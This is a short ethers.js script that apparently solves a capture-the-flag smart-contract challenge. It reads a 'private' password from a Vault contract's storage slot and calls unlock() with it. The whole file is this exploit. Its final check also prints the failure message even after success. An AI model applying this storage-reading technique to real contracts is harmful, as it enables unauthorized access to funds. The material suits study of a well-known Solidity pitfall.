import { decodeBytes32String, ethers } from "ethers";
import { Vault, Vault__factory } from "../typechain-types";
require('dotenv').config();

async function main() {
	const providerUrl = process.env.PROVIDER_URL;
	const provider = new ethers.JsonRpcProvider(providerUrl);

	const vaultAddress = "0x6b8bCfc9c101834fe1e7944c3b94994cC6fed352";
	// slot 0 represents vault bool
	// slot 1 represents private password
	let slot = 1;
	const codedPassword = await provider.getStorage(vaultAddress, slot);
	console.log(`Position: ${slot} -`,  codedPassword);
	const decodedPassword = ethers.toUtf8String(codedPassword);
	console.log ("Password:", decodedPassword);

	// Attach to Vault contract
	const wallet = new ethers.Wallet(process.env.PRIVATE_KEY ?? "", provider);
	const vaultFactory = new Vault__factory(wallet);
	const vaultContract = vaultFactory.attach(vaultAddress) as Vault;

	// Unlock vault
	console.log("Unlocking vault...");
	const unlockVault = await vaultContract.unlock(codedPassword);
	await unlockVault.wait();
	console.log("Tx hash:", unlockVault.hash, "\n");
	const checkVault = await vaultContract.locked();
	if (checkVault == false)
		console.log("Vault unlocked! B)");
	console.log("Could not unlock vault! x(");
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
